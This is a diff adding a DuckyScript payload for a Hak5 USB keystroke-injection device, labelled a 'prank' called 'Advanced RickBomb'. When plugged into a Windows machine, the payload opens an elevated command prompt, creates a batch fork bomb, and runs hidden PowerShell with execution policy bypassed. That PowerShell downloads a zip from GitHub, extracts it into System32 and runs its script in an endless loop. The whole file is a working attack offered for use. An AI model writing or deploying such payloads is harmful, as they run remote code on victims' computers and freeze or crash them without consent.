@@ -1,0 +1,20 @@
+REM Title: Advanced RickBomb
+REM Author: FalsePhilosopher
+REM Target:10-11
+REM Props: Hak5,  da3m0n s3c for the one liner, big ups to Jakoby for the ADV rickroll work I used https://github.com/I-Am-Jakoby, the community memes
+REM Version: 1.0
+REM Category: Prank
+REM Launches terminal and spawns a looping terminal forkbomb/rickroll on every thread the system reports, if you want forkers in multiple languages head here https://da3m0ns3c.blogspot.com/2017/04/fork-bomb-in-several-language-implements.html
+REM
+DELAY 300
+GUI r
+DELAY 500
+STRING cmd.exe
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING echo %0^|%0 > fb.bat&&powershell -w h -NoP -NonI curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Misc/rb.zip -O rb.zip;;Expand-Archive -Path C:\Windows\System32\rb.zip -Force;;powershell -w h -NoP -NonI -Exec Bypass "while (1) {C:\Windows\System32\rb\rb.ps1}"
+ENTER
